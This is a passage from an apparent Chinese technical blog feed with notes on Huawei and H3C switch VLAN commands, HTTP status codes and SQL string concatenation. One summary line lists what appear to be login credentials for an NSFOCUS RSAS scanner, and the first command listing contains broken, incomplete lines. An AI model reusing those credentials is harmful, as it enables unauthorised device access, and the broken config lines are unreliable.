title="VLAN的配置"></a>VLAN的配置</h3><p>1、创建VLAN</p><p>2、修改接口类型</p><p>3、设置接口允许通过的VLAN ID</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">system-view</span><br><span class="line">vlan batch 10 20</span><br><span class="line">display this</span><br><span class="line">interface GigabitEthernet 0/0/1</span><br><span class="line">port link-type access</span><br><span class="line">port default vlan 10</span><br><span class="line">Q</span><br><span class="line">interface GigabitEthernet 0/0/2</span><br><span class="line">port link-type access</span><br><span class="line">port default vlan 10</span><br><span class="line">Q</span><br><span class="line">interface GigabitEthernet 0/0/3</span><br><span class="line">port link-type trunk</span><br><span class="line">port trunk allow pass vlan 10 20</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">system-view</span><br><span class="line">vlan batch 10 20</span><br><span class="line">interface GigabitEthernet 0/0/</span><br><span class="line">port link-type access</span><br><span class="line">port default vlan </span><br><span class="line">Q</span><br><span class="line">interface GigabitEthernet 0/0/3</span><br><span class="line">port link-type access</span><br><span class="line">port link-type vlan 20</span><br><span class="line">Q</span><br><span class="line">port link-type trunk</span><br><span class="line">port link-type allow-pass vlan 10 20</span><br></pre></td></tr></table></figure><p>![](C:\Users\Edward Lee\桌面\nsfocus\pic\VLAN配置.png)</p><p>1、如果一个Trunk链路PVID是5，且端口下配置port trunk allow-pass vlan 2 3，那么哪些VLAN的流量可以通过该Trunk链路进行传输?</p><p>VLAN 1 2 3都可以通过，因为Trunk接口允许VLAN 1通过</p><p>2、PVID为2的Access端口收到一个不带标记的顿会采取什么样的动作作?</p><p>收到数据后会添加VLAN Tag，VLAN ID和端口的PVID相同，即为2</p><h3 id="常见交换机命令区别"><a href="#常见交换机命令区别" class="headerlink" title="常见交换机命令区别"></a>常见交换机命令区别</h3><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/202401241211859.png"></p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/202401241047450.png"></p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/202401241050420.png"></p><p>下面是华为与H3C的命令情况</p><h4 id="华为交换机基础配置命令"><a href="#华为交换机基础配置命令" class="headerlink" title="华为交换机基础配置命令"></a>华为交换机基础配置命令</h4><h5 id="创建vlan"><a href="#创建vlan" class="headerlink" title="创建vlan"></a>创建vlan</h5><p><Quidway> //用户视图，也就是在Quidway模式下运行命令。<br><Quidway>system-view //进入配置视图<br>[Quidway] vlan 10 //创建vlan 10，并进入vlan10配置视图，如果vlan10存在就直接进入vlan10配置视图<br>[Quidway-vlan10] quit //回到配置视图<br>[Quidway] vlan 100 //创建vlan 100，并进入vlan100配置视图，如果vlan10存在就直接进入vlan100配置视图</p><p>[Quidway-vlan100] quit //回到配置视图</p><h5 id="将端口加入到vlan中"><a href="#将端口加入到vlan中" class="headerlink" title="将端口加入到vlan中"></a>将端口加入到vlan中</h5><p>[Quidway] interface GigabitEthernet2/0/1 (10G光口)<br>[Quidway- GigabitEthernet2/0/1] port link-type access //定义端口传输模式<br>[Quidway- GigabitEthernet2/0/1] port default vlan 100 //将端口加入vlan100<br>[Quidway- GigabitEthernet2/0/1] quit //回到配置视图</p><p>[Quidway] interface GigabitEthernet1/0/0 //进入1号插槽上的第一个千兆网口配置视图中。0代表1号口<br>[Quidway- GigabitEthernet1/0/0] port link-type access //定义端口传输模式<br>[Quidway- GigabitEthernet2/0/1] port default vlan 10 //将这个端口加入到vlan10中<br>[Quidway- GigabitEthernet2/0/1] quit</p><h5 id="将多个端口加入到VLAN中"><a href="#将多个端口加入到VLAN中" class="headerlink" title="将多个端口加入到VLAN中"></a>将多个端口加入到VLAN中</h5><p><Quidway>system-view<br>[Quidway]vlan 10<br>[Quidway-vlan10]port GigabitEthernet 1/0/0 to 1/0/29 //将0到29号口加入到vlan10中<br>[Quidway-vlan10]quit</p><h5 id="交换机配置IP地址"><a href="#交换机配置IP地址" class="headerlink" title="交换机配置IP地址"></a>交换机配置IP地址</h5><p>[Quidway] interface Vlanif100 // 进入vlan100接口视图与vlan 100命令进入的地方不同<br>[Quidway-Vlanif100] ip address 119.167.200.90 255.255.255.252 // 定义vlan100管理IP三层 交换网关路由<br>[Quidway-Vlanif100] quit //返回视图<br>[Quidway] interface Vlanif10 // 进入vlan10接口视图与vlan 10命令进入的地方不同<br>[Quidway-Vlanif10] ip address 119.167.206.129 255.255.255.128 // 定义vlan10管理IP三层交换网关路由</p><p>[Quidway-Vlanif10] quit</p><h5 id="配置默认网关："><a href="#配置默认网关：" class="headerlink" title="配置默认网关："></a>配置默认网关：</h5><p>[Quidway]ip route-static 0.0.0.0 0.0.0.0 119.167.200.89 //配置默认网关。</p><h5 id="交换机保存设置和重置命令"><a href="#交换机保存设置和重置命令" class="headerlink" title="交换机保存设置和重置命令"></a>交换机保存设置和重置命令</h5><p><Quidway>save //保存配置信息<br><Quidway>reset saved-configuration //重置交换机的配置<br><Quidway>reboot //重新启动交换机</p><h5 id="交换机常用的显示命令"><a href="#交换机常用的显示命令" class="headerlink" title="交换机常用的显示命令"></a>交换机常用的显示命令</h5><p>用户视图模式下：<br><Quidway>display current-configuration //显示现在交换机正在运行的配置明细<br><Quidway>display device //显示各设备状态<br><Quidway>display interface ？ //显示个端口状态，用？可以查看后边跟的选项<br><Quidway>display version //查看交换机固件版本信息<br><Quidway>display vlan ？ // 查看vlan的配置信息</p><h5 id="恢复交换机出厂设置"><a href="#恢复交换机出厂设置" class="headerlink" title="恢复交换机出厂设置"></a>恢复交换机出厂设置</h5><p><Quidway>reset saved-configuration //重置交换机的配置</p><h4 id="H3C交换机的基本配置"><a href="#H3C交换机的基本配置" class="headerlink" title="H3C交换机的基本配置"></a>H3C交换机的基本配置</h4><p>我们先来了解下h3c的配置命令与功能，都是常用的，基本上大部分网络配置都少不了这些命令。</p><h5 id="基本配置"><a href="#基本配置" class="headerlink" title="基本配置"></a>基本配置</h5><p><H3C> //用户直行模式提示符,用户视图 <H3C>system-view //<strong>进入配置视图</strong><br>[H3C] sysname xxx //设置主机名成为xxx这里使用修改特权用户密码</p><h5 id="用户配置"><a href="#用户配置" class="headerlink" title="用户配置"></a>用户配置</h5><p><H3C>system-view</p><p>[H3C]super password H3C //设置用户分级密码</p><p>[H3C]undo superpassword //删除用户分级密码</p><p>[H3C]localuser bigheap 1234561 //Web网管用户设置,1为管理级用户</p><p>[H3C]undo localuser bigheap //删除Web网管用户</p><p>[H3C]user-interface aux 0 //只支持0</p><p>[H3C-Aux]idle-timeout 250 //设置超时为2分50秒,若为0则表示不超时,默认为5分钟</p><p>[H3C-Aux]undoidle-timeout //恢复默认值</p><p>[H3C]user-interface vty 0 //只支持0和1</p><p>[H3C-vty]idle-timeout 250 //设置超时为2分50秒,若为0则表示不超时,默认为5分钟</p><p>[H3C-vty]undoidle-timeout //恢复默认值</p><p>[H3C-vty]set authentication password123456 //设置telnet密码,必须设置</p><p>[H3C-vty]undo set authenticationpassword //取消密码</p><p>[H3C]displayusers //显示用户</p><p>[H3C]displayuser-interface //用户界面状态</p><h5 id="vlan配置"><a href="#vlan配置" class="headerlink" title="vlan配置"></a>vlan配置</h5><p>[H3C]vlan 2 <strong>//创建VLAN2</strong></p><p>[H3C]undo vlanall //删除除缺省VLAN外的所有VLAN,缺省VLAN不能被删除</p><p>[H3C-vlan2]port Ethernet 0/4 to Ethernet0/7 //将4到7号端口加入到VLAN2中,此命令只能用来加access端口,不能用来增加trunk或者hybrid端口</p><p>[H3C-vlan2]port-isolate enable //打开VLAN内端口隔离特性，不能二层转发,<strong>默认不启用该功能</strong></p><p>[H3C-Ethernet0/4]port-isolate uplink-portvlan 2 //设置4为VLAN2的<strong>隔离上行端口</strong>，用于转发二层数据,只能配置一个上行端口,若为trunk,则建议允许所有VLAN通过,隔离不能与汇聚同时配置</p><p>[H3C]display vlan all //<strong>显示所有VLAN的详细信息</strong></p><p>[H3C]user-group 20 //创建user-group 20，默认只存在user-group 1</p><p>[H3C-UserGroup20]port Ethernet 0/4 toEthernet 0/7 //<strong>将4到7号端口加入到VLAN20中，</strong>初始时都属于user-group 1中</p><p>[H3C]display user-group 20 //显示user-group 20的相关信息</p><h5 id="交换机ip配置"><a href="#交换机ip配置" class="headerlink" title="交换机ip配置"></a>交换机ip配置</h5><p>[H3C]vlan 20 //<strong>创建vlan</strong></p><p>[H3C]management-vlan 20 //管理vlan</p><p>[H3C]interface vlan-interface 20 //<strong>进入并管理vlan20</strong></p><p>[H3C]undo interface vlan-interface 20 //删除管理VLAN端口</p><p>[H3C-Vlan-interface20]ip address192.168.1.2 255.255.255.0 //<strong>配置管理VLAN接口静态IP地址</strong></p><p>[H3C-Vlan-interface20]undo ipaddress //删除IP地址</p><p>[H3C-Vlan-interface20]ip gateway 192.168.1.1 //指定缺省网关(默认无网关地址)</p><p>[H3C-Vlan-interface20]undo ip gateway</p><p>[H3C-Vlan-interface20]shutdown //<strong>关闭接口</strong></p><p>[H3C-Vlan-interface20]undo shutdown //开启</p><p>[H3C]display ip //显示管理VLAN接口IP的相关信息</p><p>[H3C]display interface vlan-interface20 //查看管理VLAN的接口信息</p><p><H3C>debugging ip //开启IP调试功能</p><p><H3C>undo debugging ip</p><h5 id="DHCP客户端配置"><a href="#DHCP客户端配置" class="headerlink" title="DHCP客户端配置"></a>DHCP客户端配置</h5><p>[H3C-Vlan-interface20]ip address dhcp-alloc // 管理VLAN接口<strong>通过DHCP方式获取IP地址</strong></p><p>[H3C-Vlan-interface20]undo ip address dhcp-alloc // 取消</p><p>[H3C]display dhcp //显示DHCP客户信息</p><p><H3C>debugging dhcp-alloc //开启DHCP调试功能</p><p><H3C>undo debugging dhcp-alloc</p><h5 id="端口配置"><a href="#端口配置" class="headerlink" title="端口配置"></a>端口配置</h5><p>[H3C]interface Ethernet0/3 //进入端口</p><p>[H3C-Ethernet0/3]shutdown //关闭端口</p><p>[H3C-Ethernet0/3]speed 100 //速率可为10,100,1000和auto(缺省)</p><p>[H3C-Ethernet0/3]duplexfull //<strong>双工,可</strong>为half,full和auto，光口和汇聚后不能配置</p><p>[H3C-Ethernet0/3]flow-control //<strong>开启流控，默认为关闭</strong></p><p>[H3C-Ethernet0/3]broadcast-suppression 20 //设置抑制广播百分比为20%,可取5,10,20,100,缺省为100,同时组播和未知单播也受此影响</p><p>[H3C-Ethernet0/3]loopback internal //内环测试</p><p>[H3C-Ethernet0/3]port link-type trunk //设置链路的<strong>类型为trunk</strong></p><p>[H3C-Ethernet0/3]port trunk pvid vlan 20 //设置20为该trunk的缺省VLAN，默认为1(trunk线路两端的PVID必须一致)</p><p>[H3C-Ethernet0/3]port access vlan 20 //将当前<strong>access端口加入指定的VLAN</strong></p><p>[H3C-Ethernet0/3]port trunk permit vlanall //允许**所有的VLAN通过当前的trunk端口,**可多次使用该命令</p><p>[H3C-Ethernet0/3]mdiauto //设置以太端口为自动监测,normal为直通线,across为交叉线</p><p>[H3C]link-aggregation Ethernet 0/1 toEthernet 0/4 //**将1-4口加入汇聚组,**1为主端口,两端需要同时配置,设置了端口镜像以及端口隔离的端口无法汇聚</p><p>[H3C]undo link-aggregation Ethernet 0/1 //删除该汇聚组</p><p>[H3C]link-aggregation mode egress //配置端口汇聚模式为根据目的MAC地址进行负荷分担,可选为 ingress,egress和both,缺省为both</p><p>[H3C]monitor-port Ethernet 0/2 //<strong>将该端口设置为镜像端口</strong>,必须先设置镜像端口,删除时必须先删除被镜像端口,而且它们不能同在一个端口,该端口不能在汇聚组中,设置新镜像端口时,新取代旧,被镜像不变</p><p>[H3C]mirroring-port Ethernet 0/3 toEthernet 0/4 both //将<strong>端口3和4设置为被镜像端口</strong>,both为同时监控接收和发送的报文,inbound表示仅监控接收的报文,outbound表示仅监控发送的报文</p><p>[H3C]display mirror</p><p>[H3C]display interface Ethernet 0/3</p><p><H3C>resetcounters //<strong>清除所有端口的统计信息</strong></p><p>[H3C]display link-aggregation Ethernet0/3 //<strong>显示端口</strong>汇聚信息</p><p>[H3C-Ethernet0/3]virtual-cable-test //诊断该端口的电路状况</p><h5 id="qos优先级配置"><a href="#qos优先级配置" class="headerlink" title="qos优先级配置"></a>qos优先级配置</h5><p>QoS配置步骤：设置端口的优先级,设置交换机信任报文的优先级方式,队列调度,端口限速</p><p>[H3C-Ethernet0/3]priority 7 //设置端口<strong>优先级为7</strong>，默认为0</p><p>[H3C]priority-trustcos //设置交换机信任报文的优先级方式为cos(802.1p优先级,缺省值),还可以设为dscp方式</p><p>[H3C]queue-scheduler hq-wrr 2 4 6 8 //设置队列调度算法为HQ-WRR(默认为WRR),权重为2,4,6,8</p><p>[H3C-Ethernet0/3]line-rate inbound 29 //将<strong>端口进口速率限制</strong>为2Mbps,取1-28时,速率为rate<em>8</em>1024/125,即64,128,192…1.792M；</p><p>29-127时,速率为(rate-27)*1024,即2M,3M,4M…100M。</p><p>[H3C]displayqueue-scheduler //显示队列调度模式及参数</p><p>[H3C]displaypriority-trust //<strong>显示优先级信任模式</strong></p><h1 id="整体总结"><a href="#整体总结" class="headerlink" title="整体总结"></a>整体总结</h1><p>conadmin    conadmin   rsas</p><p>admin Nsf0cus@123</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>HTTP状态码</title>
      <link href="/2023/08/01/http-status-code/"/>
      <url>/2023/08/01/http-status-code/</url>
      
        <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>状态码（HTTP Status Code），是用以表示网页服务器超文本传输协议响应状态以3位数字组成的代码，当然你也可以称其为响应码。<br>所有状态码的第一位数字代表了相应的物种状态之一：</p><ol><li>1xx：表示<strong>临时响应</strong>并需要请求者继续执行操作的状态代码</li><li>2xx：表示<strong>成功</strong>处理了请求的状态代码</li><li>3xx：要完成请求，需要进一步操作（通常这些代码用来<strong>重定向</strong>）</li><li>4xx：表示<strong>请求可能出错</strong>，妨碍了服务器的处理</li><li>5xx：表示<strong>服务器</strong>在尝试处理请求时，发生内部错误（这些错误通常是服务器本身的错误，并不是由于请求出错，当然也有可能是访问者的故意为之，使服务器本身出现错误）</li></ol><h1 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h1><h3 id="常见状态码"><a href="#常见状态码" class="headerlink" title="常见状态码"></a>常见状态码</h3><ul><li><code>200（成功）</code>：服务器已成功处理请求。一般这表示服务器正常处理了请求，并且正常返回了相应的页面</li><li><code>403（禁止）</code>：服务器理解请求客户端的请求，拒绝请求</li><li><code>404（未找到）</code>：服务器无法根据客户端请求找到资源</li><li><code>405（方法禁用）</code>：禁用请求中指定的方法</li><li><code>500（服务器内部错误）</code>：服务器遇到一个未预料到的状况，导致无法完成对请求的处理</li><li><code>502（错误网关）</code>：服务器作为网关或者代理，从上游服务器收到无效响应</li><li><code>503（服务不可用）</code>：服务器目前无法使用。例如：超载、停机维护…</li><li><code>504（网关超时）</code>：服务器作为网关或代理，但未及时收到上游服务器的响应</li></ul><h3 id="1xx"><a href="#1xx" class="headerlink" title="1xx"></a>1xx</h3><blockquote><p>该状态码表示<strong>临时响应</strong>并需要请求者继续执行操作</p></blockquote><ul><li><code>100（继续）</code>：请求者应当继续提出请求。服务器已收到请求的第一部分，正在等待剩余部分</li><li><code>101（切换协议）</code>：请求者要求服务器切换协议，服务器也已确认切换协议</li></ul><h3 id="2xx"><a href="#2xx" class="headerlink" title="2xx"></a>2xx</h3><blockquote><p>该状态码表示<strong>成功</strong></p></blockquote><ul><li><code>200（成功）</code>：服务器已成功处理请求。一般这表示服务器正常处理了请求，并且正常返回了相应的页面</li><li><code>201（已创建）</code>：请求成功并且服务器成功创建新资源</li><li><code>202（已接受）</code>：服务器已接收请求，但仍未处理</li><li><code>203（非授权信息）</code>：服务器成功处理请求，但是返回的信息可能来自另外一来源</li><li><code>204（无内容）</code>：服务器成功处理请求，但是没有返回任何内容</li><li><code>205（重置内容）</code>：服务器成功处理请求，但没有返回任何内容</li><li><code>206（部分内容）</code>：服务器成功处理了部分GET请求</li></ul><h3 id="3xx"><a href="#3xx" class="headerlink" title="3xx"></a>3xx</h3><blockquote><p>该状态码表示要完成请求，需要进一步操作。通常这些状态码用来<strong>重定向</strong></p></blockquote><ul><li><code>300（多钟选择）</code>：针对请求，服务器可以执行多种操作。服务器可以根据请求者的（user-agent）选择一项操作，或者提供操作列表供请求者选择</li><li><code>301（永久移动）</code>：请求的网页已永久移动到新的位置。服务器返回该状态码时，会自动将请求者转到新位置</li><li><code>302（临时移动）</code>：服务器目前从不同位置的网页响应请求，但请求者应继续使用原有位置进行后续的请求</li><li><code>303（查看其它位置）</code>：请求者应当对不同的位置使用单独的GET请求来检索响应时，服务器返回此状态码</li><li><code>304（未修改）</code>：自从上次请求后，请求的网页未修改过。服务器返回此状态码时，不会返回网页内容</li><li><code>305（使用代理）</code>：请求者只能使用代理访问请求的网页</li><li><code>307（临时重定向）</code>：服务器目前从不同位置的网页响应请求，但请求者应继续使用原有位置来进行后续请求</li></ul><h3 id="4xx"><a href="#4xx" class="headerlink" title="4xx"></a>4xx</h3><blockquote><p>表示<strong>请求可能出错</strong>，妨碍了服务器的处理</p></blockquote><ul><li><code>400（错误请求）</code>：表示客户端请求的语法错误，服务器无法理解。例如：url中含有非法字符，json格式出现问题…</li><li><code>401（未授权）</code>：请求要求身份验证。一般需要登录的网站，服务器可能会返回此状态码</li><li><code>402</code>：保留</li><li><code>403（禁止）</code>：服务器理解请求客户端的请求，拒绝请求</li><li><code>404（未找到）</code>：服务器无法根据客户端请求找到资源</li><li><code>405（方法禁用）</code>：禁用请求中指定的方法</li><li><code>406（不接受）</code>：无法使用请求的内容特性响应请求的网页</li><li><code>407（需要代理授权）</code>：此状态码与<code>401</code>类似，但指定请求者应当授权使用代理</li><li><code>408（请求超时）</code>：服务器等候请求时超时</li><li><code>409（冲突）</code>：服务器在完成请求是发生冲突。服务器必须在响应中包含有关冲突的信息</li><li><code>410（已删除）</code>：请求的资源已永久删除</li><li><code>411（需要有效长度）</code>：服务器不接受不含有效内容长度标头字段的请求</li><li><code>412（未满足前提条件）</code>：服务器未满足请求者在请求中设置的其中一个前提条件</li><li><code>413（请求实体过大）</code>：相应实体过大。服务器拒绝处理当前请求，请求超过服务器所能处理和允许处理的最大值</li><li><code>414（请求的url过长）</code>：请求的url过长，服务器无法处理</li><li><code>415（不支持的媒体类型）</code>：请求的格式不受请求页面的支持</li><li><code>416（请求范围不符合要求）</code>：如果页面无法提供请求的范围，服务器则会返回此状态码</li><li><code>417（未满足期望值）</code>：在请求头<code>Expect</code>指定的预期内容无法被服务器满足</li><li><code>422（不可处理的实体）</code>：请求格式正确，但由于含有语义错误，无法响应</li></ul><h3 id="5xx"><a href="#5xx" class="headerlink" title="5xx"></a>5xx</h3><blockquote><p>表示<strong>服务器</strong>在尝试处理请求时发生内部错误。这些错误可能是服务器本身的错误，并不是请求出错，当然也有可能是请求者的故意为之，使服务器本身出现错误</p></blockquote><ul><li><code>500（服务器内部错误）</code>：服务器遇到一个未预料到的状况，导致无法完成对请求的处理</li><li><code>501（尚未实施）</code>：服务器不具备完成请求的功能。例如：服务器无法识别请求方法…</li><li><code>502（错误网关）</code>：服务器作为网关或者代理，从上游服务器收到无效响应</li><li><code>503（服务不可用）</code>：服务器目前无法使用。例如：超载、停机维护…</li><li><code>504（网关超时）</code>：服务器作为网关或代理，但未及时收到上游服务器的响应</li><li><code>505（HTTP版本不受支持）</code>：服务器不支持请求中所用的HTTP版本</li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SQL拼接</title>
      <link href="/2023/08/01/SQL%E6%8B%BC%E6%8E%A5/"/>
      <url>/2023/08/01/SQL%E6%8B%BC%E6%8E%A5/</url>
      
        <content type="html"><![CDATA[<p>MySQL和SQL Sever的SQL拼接有些不同。</p><p>MySQL拼接符号<code>+</code>、<code>CONCAT</code>、<code>CONCAT_WS</code>、<code>GROUP_CONTACT</code></p><p>SQL Sever拼接符号<code>+</code>、<code>for xml path</code></p><div align = "center">MyTable</div><table><thead><tr><th>ID</th><th>Name</th><th>Score1</th><th>Score2</th></tr></thead><tbody><tr><td>1</td><td>A</td><td>90</td><td>67</td></tr><tr><td>2</td><td>B</td><td>66</td><td>56</td></tr><tr><td>3</td><td>C</td><td>87</td><td>78</td></tr><tr><td>4</td><td>D</td><td>67</td><td>96</td></tr><tr><td>5</td><td>A</td><td>97</td><td>78</td></tr><tr><td>6</td><td>D</td><td>78</td><td>67</td></tr><tr><td>7</td><td>E</td><td>56</td><td>86</td></tr></tbody></table><h2 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h2><h3 id=""><a href="#" class="headerlink" title="+"></a>+</h3><p>当两个字段都是整型时，MySQL和SQL Sever结果相同，都会返回两个整型值的和；</p><p>当两个字段中有一个为字符串时，MySQL的返回结果——默认字符串为0，再返回两个字段之和，而SQL Sever的返回结果——直接拼接两个字段。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> Score1 <span class="operator">+</span> Score2 <span class="keyword">where</span> ID <span class="operator">=</span> <span class="number">1</span>;<span class="operator">/</span><span class="operator">/</span>都返回两个字段之和，即<span class="number">157</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> Name <span class="operator">+</span> Score1 <span class="keyword">where</span> ID <span class="operator">=</span> <span class="number">1</span> ;<span class="operator">/</span><span class="operator">/</span>MySQL返回<span class="number">90</span>，SQLSever返回A90</span><br></pre></td></tr></table></figure><h3 id="CONCAT"><a href="#CONCAT" class="headerlink" title="CONCAT"></a>CONCAT</h3><p> CONTACT的功能是直接将数据<strong>按照字符串格式拼接</strong>。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> CONCAT(ID,Name,Score1) <span class="keyword">from</span> MyTable <span class="keyword">where</span> ID <span class="operator">=</span> <span class="number">1</span>;<span class="operator">/</span><span class="operator">/</span>返回值为 <span class="number">1</span>A90;</span><br></pre></td></tr></table></figure><p><strong>PS</strong>：如果CONCAT后括号里其中有一个参数的值为null，那么这个语句的返回值就为null</p><h3 id="CONCAT-WS"><a href="#CONCAT-WS" class="headerlink" title="CONCAT_WS"></a>CONCAT_WS</h3><p>用法与CONCAT类似，其中第一个参数为分隔符，在返回的值中，每一个参数之间都会有第一个参数作为分隔。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> CONCAT_WS(<span class="string">&#x27;-&#x27;</span>,ID,Name,Score1) <span class="keyword">from</span> MyTable <span class="keyword">where</span> ID <span class="operator">=</span> <span class="number">1</span>;<span class="operator">/</span><span class="operator">/</span>返回值为 <span class="number">1</span><span class="operator">-</span>A<span class="number">-90</span>;</span><br></pre></td></tr></table></figure><p><strong>PS</strong>：如果分隔符（即第一个参数）为null，那么返回值为null；如果后边的参数（除分隔符之外的参数）有null，那么这个参数会被忽略，只返回其他参数和分隔符组成的字符串。</p><h3 id="GROUP-CONTACT"><a href="#GROUP-CONTACT" class="headerlink" title="GROUP_CONTACT"></a>GROUP_CONTACT</h3><p> 在我们使用数据库时，会碰到这样一种情况：同一个Name的人有两条数据，但是他们的其他数据并不相同，而我们所需要的是同一个Name的人的Score1集合，即需要获得Name为A的所有的Score1并且希望将其拼接为一个字段，这里我们就需要用到ROUP_CONCAT。</p><p>语法如下：</p><p><code>group_concat(要连接的字段) [Order BY 排序字段 ASC/DESC]  [Separator &#39;分隔符&#39;] </code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> Name,GROUP_CONCAT(Score1 Separator <span class="string">&#x27;-&#x27;</span>) <span class="keyword">FROM</span> MyTable <span class="keyword">GROUP</span> <span class="keyword">BY</span> Name;</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>其中<span class="keyword">GROUP</span> <span class="keyword">BY</span> 后面的字段是Name，所有同一排序字段的数据会被拼接后存入同一字段中，并以相应的分隔符分分隔。</span><br></pre></td></tr></table></figure><p>结果如下：</p><table><thead><tr><th align="center">Name</th><th align="center">GROUP_CONCAT(Score1 SEPARATOR’-‘)</th></tr></thead><tbody><tr><td align="center">A</td><td align="center">90-97</td></tr><tr><td align="center">B</td><td align="center">66</td></tr><tr><td align="center">C</td><td align="center">87</td></tr><tr><td align="center">D</td><td align="center">67-78</td></tr><tr><td align="center">E</td><td align="center">56</td></tr></tbody></table><p> 其中GROUP BY 后面的字段是Name，所有同一排序字段的数据会被拼接后存入同一字段中，并以相应的分隔符分分隔。</p><p><strong>PS</strong>：GROUP_CONCAT默认长度为1024。可以用下列语句查看并修改其长度。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> VARIABLES <span class="keyword">LIKE</span> &quot;%group_concat_max_len%&quot;<span class="operator">/</span><span class="operator">/</span>查看长度</span><br><span class="line"> </span><br><span class="line"><span class="keyword">SET</span> SESSION group_concat_max_len <span class="operator">=</span> <span class="number">102400</span>; <span class="operator">/</span><span class="operator">/</span>修改长度</span><br></pre></td></tr></table></figure><h2 id="SQL-sever"><a href="#SQL-sever" class="headerlink" title="SQL sever"></a>SQL sever</h2><h3 id="将一整列的值拼接为一个字符串-for-xml-path"><a href="#将一整列的值拼接为一个字符串-for-xml-path" class="headerlink" title="将一整列的值拼接为一个字符串 for xml path"></a>将一整列的值拼接为一个字符串 for xml path</h3><p>在Sql Server中可以将数据以xml格式显示，for xml path就是显示为xml的一种方式。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">&#x27;,&#x27;</span> <span class="operator">+</span> Name <span class="keyword">from</span> MyTable <span class="keyword">for</span> xml path(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>预期结果如下：</span><br><span class="line">,A,B,C,D,A,D,E</span><br></pre></td></tr></table></figure><p><strong>第一个A前面多了一个逗号</strong>，这是在查询语句中就标明了的，如果想要去除这个逗号，就需要用到stuff函数。</p><p><strong>PS</strong>:语句末尾的<code>(&#39;&#39;)</code>不可少，他的功能是为了去除表格中的行标志，因为在数据库表中，这些数据来自同一列的不通行，需要使用这种方法去除行标志，不然数据在xml中仍然会以列的形式呈现。</p><p> <code>STUFF(string,insert position,delete count,string inserted)</code></p><p>它函数的功能是<strong>将一个字符串插入到另一个字符串中</strong>。插入时，插入的字符串可以覆盖原有的指定数量的字符。</p><p>　第一个参数string，指的就是原字符串，即需要被改变的字符串，它可以是一个固定字符串，也可以指定为数据库中的某一字段列，在这里我们填写的是经过for xml path处理过的字段；</p><p>　第二个参数insert position，指插入字符串的位置，<strong>SQL Server中默认是从1开始</strong>，而非从0开始，在这里我们需要删除字符串首的逗号，因此我们的insert position为1；</p><p>　第三个参数delete count，指的是要删除的字符个数，从insert position删除指定的个数，如果count为0表示不删除，我们只需要删除一个逗号，因此delete count也为1；</p><p>　第四个参数string inserted，表示要插入的字符串，在删除过后，可以在删除的位置插入想要的字符串，如果不插入字符串，则第四个参数即为两个单引号；</p><p>   综上所述，我们的语句应为：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> stuff((<span class="keyword">select</span> <span class="string">&#x27;,&#x27;</span> <span class="operator">+</span> Name <span class="keyword">from</span> MyTable <span class="keyword">for</span> xml path(<span class="string">&#x27;&#x27;</span>)),<span class="number">1</span>,<span class="number">1</span>,<span class="string">&#x27;&#x27;</span>);</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>返回结果如下</span><br><span class="line">A,B,C,D,A,D,E</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>公网&amp;私网、内网&amp;外网</title>
      <link href="/2023/07/27/%E5%85%AC%E7%BD%91-%E7%A7%81%E7%BD%91/"/>
      <url>/2023/07/27/%E5%85%AC%E7%BD%91-%E7%A7%81%E7%BD%91/</url>
      
